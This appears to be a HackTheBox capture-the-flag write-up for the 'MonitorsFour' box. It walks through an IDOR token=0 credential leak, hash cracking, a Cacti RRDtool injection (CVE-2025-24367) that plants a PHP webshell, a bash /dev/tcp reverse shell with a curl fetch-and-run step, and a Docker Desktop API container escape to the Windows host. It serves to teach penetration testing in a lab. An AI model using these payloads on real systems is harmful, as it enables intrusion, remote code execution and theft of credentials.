# MonitorsFour — From Zero to Docker Desktop Escape

A HackTheBox Journey Through Falsy Values, Cacti Cactus Pricks, and Container Chaos 🐳

---

Ever tried to escape a Docker container only to find yourself inside… *another* Docker container? Welcome to MonitorsFour, where nothing is quite what it seems.

This Medium-difficulty box taught me that the front door is often locked, but someone always leaves a side window open. Let's walk through it together.

---

## The Attack Chain at a Glance

Before we dive deep, here's the path from zero to SYSTEM:

1. **IDOR vulnerability** (token=0) leaks credentials
2. **Hash cracking** reveals `marcus:wonderful1`
3. **Credential reuse** grants Cacti admin access
4. **CVE-2025-24367** gives us RCE via graph template injection
5. **Docker Desktop API abuse** (CVE-2025-9074) escapes the container
6. **Windows SYSTEM** access via privileged container mount

Total time: approximately 2 hours.

---

## 🔍 Phase 1: Reconnaissance

### The First Scan

```
nmap -sC -sV 10.10.11.98
```

Results:

```
PORT     STATE SERVICE
80/tcp   open  http     nginx
5985/tcp open  http     WinRM
```

Wait a minute. Nginx typically runs on Linux. WinRM is Windows-only. This combination immediately suggests we're dealing with containers.

File that observation away — it becomes critical later.

---

### The Hunt for Hidden Hosts

The main site at `monitorsfour.htb` was boring. A corporate template with a login form that led nowhere.

But experienced hunters know the real treasure often hides in subdomains.

```
wfuzz -c -z file,/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -H "Host: FUZZ.monitorsfour.htb" --hh 13688 http://10.10.11.98
```

Result:

```
000000034:   302   "cacti"
```

Hello, `cacti.monitorsfour.htb`!

> 💡 **Lesson #1:** Always enumerate subdomains. The main site might be locked tight, but someone left the side window open.

---

## 🔓 Phase 2: Finding the Keys

### The Curious Case of Token Zero

While exploring the main site's API, I found an interesting endpoint: `/user`

```
curl "http://monitorsfour.htb/user"
# 401 Unauthorized

curl "http://monitorsfour.htb/user?token=abc123"
# 401 Unauthorized

curl "http://monitorsfour.htb/user?token=0"
# 😱 Wait, what?
```

The response dumped *everything*:

```
[
  {"username":"admin","password":"56b32eb43e6f15395f6c46c1c9e1cd36","name":"Marcus Higgins"},
  {"username":"mwatson","password":"69196959c16b26ef00b77d82cf6eb169","name":"Michael Watson"},
  ...
]
```

### What Just Happened?

The application has a flaw in how it validates the token parameter. Here's the pseudocode of the bug:

```
if token:  # When token=0, this evaluates to False!
    validate_token(token)
else:
    return all_users()  # Oops
```

In many programming languages, `0` is a "falsy" value. The developer checked `if token` instead of `if token is not None`.

> 💡 **Lesson #2:** Always test edge cases like `0`, `-1`, `null`, and empty strings. Type juggling vulnerabilities are everywhere.

---

### Cracking the Hash

The password `56b32eb43e6f15395f6c46c1c9e1cd36` is 32 hex characters — classic MD5.

```
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

Result: `wonderful1`

**Credentials acquired:** `marcus:wonderful1`

---

### Into the Cacti 🌵

With our shiny new credentials, I tried logging into Cacti.

**Attempt 1:** `admin:admin`
- Works! But limited permissions. Can't access Graph Templates.

**Attempt 2:** `marcus:wonderful1`
- Works with FULL ADMIN ACCESS! 🎉

> 💡 **Lesson #3:** Credential reuse is extremely common. Always try discovered passwords everywhere.

---

## 🚀 Phase 3: Getting a Shell

### CVE-2025-24367 — The Cacti RCE

Cacti 1.2.28 has a nasty vulnerability: Graph Template Injection via RRDtool.

**How it works:**

1. Cacti uses RRDtool to generate graphs
2. The `right_axis_label` field isn't sanitized
3. We can inject RRDtool commands to write arbitrary files
4. Write a PHP webshell and we have RCE

---

### Setting Up the Attack

**Step 1:** Create reverse shell payload

```
echo '#!/bin/bash
bash -i >& /dev/tcp/YOUR_IP/4455 0>&1' | sudo tee /var/www/html/bash
```

**Step 2:** Start your listener using tmux for persistence

```
tmux new-session -d -s shell "nc -lvnp 4455"
```

**Step 3:** Navigate to Graph Templates in Cacti
- Console → Templates → Graph Templates
- Click "Unix - Logged in Users"

**Step 4:** Inject this payload in "Right Axis Label":

```
XXX
create my.rrd --step 300 DS:temp:GAUGE:600:-273:5000 RRA:AVERAGE:0.5:1:1200
graph shell.php -s now -a CSV DEF:out=my.rrd:temp:AVERAGE LINE1:out:<?=`$_REQUEST[0]`;?>
```

**Step 5:** Save, trigger the graph, then visit:

```
http://cacti.monitorsfour.htb/cacti/shell.php?0=id
```

Output: `uid=33(www-data) gid=33(www-data)` ✨

---

### Pop That Shell

```
# Download and execute reverse shell
curl "http://cacti.monitorsfour.htb/cacti/shell.php?0=curl%20YOUR_IP/bash%20-o%20/tmp/s.sh"
curl "http://cacti.monitorsfour.htb/cacti/shell.php?0=bash%20/tmp/s.sh"
```

Attach to your tmux session:

```
tmux attach -t shell
```

Connection received:

```
www-data@821fbd6a43fa:~/html/cacti$
```

Wait. That hostname `821fbd6a43fa` looks suspicious. That's a Docker container ID!

---

## 🏴 Phase 4: User Flag

Quick grab:

```
cat /home/marcus/user.txt
```

**User Flag:** `87f9db79ef98e5c367d3ca15d2b70100` ✅

But we're trapped in a container. The real challenge begins now.

---

## 🔝 Phase 5: The Great Escape

### Container Reconnaissance

```
uname -a
# Linux 6.6.87.2-microsoft-standard-WSL2
```

**WSL2!** We're in a Docker container running inside Windows Subsystem for Linux.

The architecture looks like this:

- Windows 11 Host
  - WSL2 VM
    - Docker Desktop
      - Our container ← *we are here*

---

### Down the Rabbit Hole (Dead Ends)

Before finding the real path, I tried several things that didn't work:

**SSH to containers** — Port 22 closed everywhere. No SSH installed.

**RSA key from database** — Found a private key in Cacti's settings table. Spent 20 minutes trying to use it. Turns out it's for Cacti's internal data collection encryption, not authentication. Red herring.

**WinRM with marcus creds** — Authentication failed. Different password on Windows.

**Mount host filesystem** — Empty directories. Container isolation working as intended.

> 💡 **Lesson #4:** Document your dead ends! They teach you what NOT to do next time and save hours on future engagements.

---

### The Real Vulnerability — CVE-2025-9074

Docker Desktop has a dirty secret: it exposes its API at `192.168.65.7:2375` to internal containers — without authentication.

```
curl http://192.168.65.7:2375/version
```

Response:

```
{
  "Version": "28.3.2",
  "ApiVersion": "1.51",
  "KernelVersion": "6.6.87.2-microsoft-standard-WSL2"
}
```

We have unauthenticated access to the Docker API!

---

### Creating Our Escape Pod

**Step 1:** Create a privileged container with host mount

```
curl -X POST http://192.168.65.7:2375/containers/create \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine",
    "Cmd": ["/bin/sh"],
    "HostConfig": {
      "Privileged": true,
      "Binds": ["/:/mnt/host"]
    }
  }'
```

Response: `{"Id":"661652c6b7f5..."}`

**Step 2:** Start the container

```
curl -X POST http://192.168.65.7:2375/containers/661652c6b7f5.../start
```

**Step 3:** Execute commands via the API

```
curl -X POST "http://192.168.65.7:2375/containers/661652c6b7f5.../exec" \
  -H "Content-Type: application/json" \
  -d '{"Cmd":["ls","-la","/mnt/host/mnt/host"],"AttachStdout":true}'
```

Result:

```
drwxrwxrwx  1 root root 4096 Dec  2 12:02 c    ← WINDOWS C: DRIVE!
drwxrwxrwt  3 root root   80 Jan  3 13:27 wsl
drwxrwxrwt  6 root root  240 Jan  3 13:27 wslg
```

We have access to the Windows filesystem!

---

## 🏆 Phase 6: Root Flag

The path is wild but makes sense given the nested virtualization:

```
/mnt/host/mnt/host/c/Users/Administrator/Desktop/root.txt
```

Execute through the API:

```
curl -X POST "http://192.168.65.7:2375/containers/661652c6b7f5.../exec" \
  -H "Content-Type: application/json" \
  -d '{"Cmd":["cat","/mnt/host/mnt/host/c/Users/Administrator/Desktop/root.txt"],"AttachStdout":true}'
```

**Root Flag:** `9cc346497fd27757514faa32524678f4` 🎉

---

## 📚 Key Takeaways

### What Made This Box Special

**IDOR via token=0** — Always test falsy values on every parameter.

**Credential reuse** — Try discovered passwords on every login form you find.

**Cacti RRDtool injection** — Know your CVEs and understand how they work mechanically.

**Docker Desktop API exposure** — Container internals matter. The escape vector was hiding in plain sight at a predictable IP address.

---

### For Your Next Pentest

- Vhost enumerate immediately after port scanning
- Test `0`, `-1`, `null`, and empty strings on every parameter
- In containers, always check for Docker socket or API access
- Learn Docker Desktop internals — `192.168.65.7:2375` is a goldmine

---

### Time Breakdown

- **Enumeration:** 25 minutes
- **Initial Access:** 35 minutes
- **Dead Ends:** 20 minutes 😅
- **Container Escape:** 40 minutes
- **Total:** approximately 2 hours

---

## 🎬 Quick Reproduction (Speedrun)

For those who want to reproduce this quickly:

```
# 1. Setup hosts
echo "10.10.11.98 monitorsfour.htb cacti.monitorsfour.htb" | sudo tee -a /etc/hosts

# 2. Get credentials via IDOR
curl -s "http://monitorsfour.htb/user?token=0"
# Crack hash: 56b32eb43e6f15395f6c46c1c9e1cd36 = wonderful1

# 3. Exploit Cacti CVE-2025-24367 for shell as www-data

# 4. User flag
cat /home/marcus/user.txt

# 5. Docker API escape
curl -X POST http://192.168.65.7:2375/containers/create \
  -d '{"Image":"alpine","HostConfig":{"Privileged":true,"Binds":["/:/mnt/host"]}}'

# 6. Root flag via exec API
# Path: /mnt/host/mnt/host/c/Users/Administrator/Desktop/root.txt
```

---

## Final Thoughts

MonitorsFour is a masterclass in chained vulnerabilities. No single bug gives you the crown — you need to chain:

1. Information disclosure →
2. Hash cracking →
3. Credential reuse →
4. Authenticated RCE →
5. Container escape

Each step builds on the last. That's what makes real-world pentesting — and boxes like this — so satisfying.

Happy Hacking! 🏴‍☠️

---

*If you found this helpful, give it a clap and follow for more HackTheBox writeups!*

*Questions? Drop a comment below.*
